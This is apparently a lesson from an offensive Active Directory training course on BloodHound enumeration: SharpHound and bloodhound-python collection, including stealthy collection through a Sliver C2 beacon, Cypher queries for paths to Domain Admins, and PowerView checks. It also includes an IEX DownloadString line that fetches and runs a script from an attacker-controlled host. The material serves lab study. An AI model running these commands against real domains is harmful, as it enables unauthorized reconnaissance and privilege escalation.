# Phase 11: AD Enumeration — Reading the Attack Surface

> **Why**: BloodHound output means nothing if you don't know how to read it. This phase turns you into someone who can look at a domain and immediately see the attack paths.

**Study time**: 1 week | **Difficulty**: Intermediate

---

## Learning Objectives

- [ ] Explain what BloodHound collects and how it builds its graph
- [ ] Run SharpHound, load data, and identify a DA path in under 10 minutes
- [ ] Write 3 custom Cypher queries for specific scenarios
- [ ] Use PowerView to manually verify BloodHound findings
- [ ] Enumerate LDAP directly to find Kerberoastable and AS-REP-roastable accounts

---

## 1. How BloodHound Works

BloodHound has two parts:
- **SharpHound / bloodhound-python**: The **collector** — connects to the domain and queries LDAP, SMB (for sessions), and RPC to pull raw data about every object: users, groups, computers, ACLs, GPOs, sessions
- **BloodHound GUI + Neo4j**: The **analyzer** — stores the data as a graph database and lets you query it

### What BloodHound collects

```
Users           → all user objects, attributes (SPN, pre-auth, admin count)
Groups          → all groups and memberships (recursive)
Computers       → all computer objects (delegation flags, admin access)
ACLs            → all ACEs on every object (GenericAll, WriteDACL, etc.)
Sessions        → where users are currently logged in (via NetSessionEnum)
GPOs            → which OUs have which GPOs applied
Trusts          → domain trust relationships
```

### The graph model

BloodHound stores all of this as nodes (users, computers, groups) and edges (relationships: MemberOf, AdminTo, HasSession, GenericAll, etc.). When you ask "shortest path from User A to Domain Admins," Neo4j traverses the graph finding the shortest sequence of edges.

**The magic**: A human analyst might spend days manually tracing ACL chains. BloodHound does it in milliseconds.

---

## 2. Running Collections

```bash
# Linux (bloodhound-python)
bloodhound-python -u jdoe -p Password1 -d lab.local \
  -dc dc01.lab.local -c All --zip -o ~/exam/bh-data/
# --stealth flag: skips session enumeration (quieter, less complete)

# Windows (SharpHound via C2)
sliver (beacon) > execute-assembly ~/tools/SharpHound.exe \
  -c All --zipfilename bh.zip --stealth \
  --outputdirectory C:\\Windows\\Temp\\

sliver (beacon) > download C:\\Windows\\Temp\\bh.zip ~/exam/bh-data/
```

Load into BloodHound: drag-and-drop the zip file onto the BloodHound GUI.

---

## 3. First Queries to Run (in order)

```
1. Mark your user as Owned (right-click node → Mark as Owned)
2. "Shortest Paths from Owned Principals to Domain Admins"
3. "Find Kerberoastable Users with most privileges"
4. "Find AS-REP Roastable Users"
5. "Find Computers with Unconstrained Delegation" (excluding DCs)
6. "Find Principals with DCSync Rights"
```

### Reading the attack path

Each edge in BloodHound is an action you can perform. A path like:
```
jdoe →[MemberOf]→ Helpdesk →[GenericAll]→ svc_sql →[MemberOf]→ Server Admins →[AdminTo]→ SRV01
```

Means:
1. jdoe is in the Helpdesk group
2. The Helpdesk group has GenericAll on svc_sql (can reset password)
3. svc_sql is in Server Admins
4. Server Admins are local admins on SRV01

Each step is an executable attack. Right-click any edge in BloodHound to see "Help → Abuse Info" — it shows the exact commands.

---

## 4. Custom Cypher Queries

```cypher
-- All paths from any owned node to Domain Admins
MATCH p=shortestPath((u {owned:true})-[*1..]->(g:Group))
WHERE g.name =~ "(?i)DOMAIN ADMINS@.*"
RETURN p LIMIT 25

-- Who has WriteDACL on domain object? (DCSync path)
MATCH p=(n)-[:WriteDacl]->(d:Domain)
RETURN n.name, d.name

-- Non-DC computers with unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true})
WHERE NOT c.objectid ENDS WITH "-516"
RETURN c.name

-- Kerberoastable users with a path to DA
MATCH (u:User {hasspn:true, enabled:true})
MATCH p=shortestPath((u)-[*1..]->(g:Group))
WHERE g.name =~ "(?i)DOMAIN ADMINS@.*"
RETURN u.name, length(p) ORDER BY length(p)
```

---

## 5. PowerView Manual Verification

BloodHound might miss things (e.g., if session enumeration was blocked). Verify manually:

```powershell
# After AMSI bypass and PowerView load:
IEX (New-Object Net.WebClient).DownloadString('http://<ip>/PowerView.ps1')

# Domain overview
Get-Domain; Get-DomainController

# Kerberoastable + AS-REP targets
Get-DomainUser -SPN | Select samaccountname,serviceprincipalname
Get-DomainUser -PreauthNotRequired | Select samaccountname

# ACL check: what can jdoe do?
Get-DomainObjectACL -ResolveGUIDs | ? {$_.IdentityReferenceName -match "jdoe"}

# Delegation
Get-DomainComputer -Unconstrained | Select name  # check for non-DCs
Get-DomainComputer -TrustedToAuth | Select name,msds-allowedtodelegateto
```

---

## Practice Labs

| Lab | Platform | Focus |
|-----|---------|-------|
| [THM: Active Directory Enumeration](https://tryhackme.com/room/adenumeration) | THM (Sub) | BloodHound guided |
| [HTB: Active](https://app.hackthebox.com/machines/Active) | HTB (Free) | AD enum → Kerberoast → DA |
| [HTB: Sauna](https://app.hackthebox.com/machines/Sauna) | HTB (Free) | AS-REP → BloodHound → DCSync |
| Manual: GOAD enumeration | GOAD | Run BloodHound, identify all 15 known paths |

---

## Phase 11 Mastery Checklist

- [ ] Can you load BloodHound data and identify a DA path in under 5 minutes?
- [ ] Can you explain what edge in BloodHound means what attack?
- [ ] Can you write a Cypher query to find WriteDACL on domain objects?
- [ ] Can you use PowerView to find Kerberoastable accounts?
- [ ] Can you explain what SharpHound collects and how BloodHound builds its graph?

---

## Next Phase → **Phase 12: Kerberos — Protocol to Attacks**
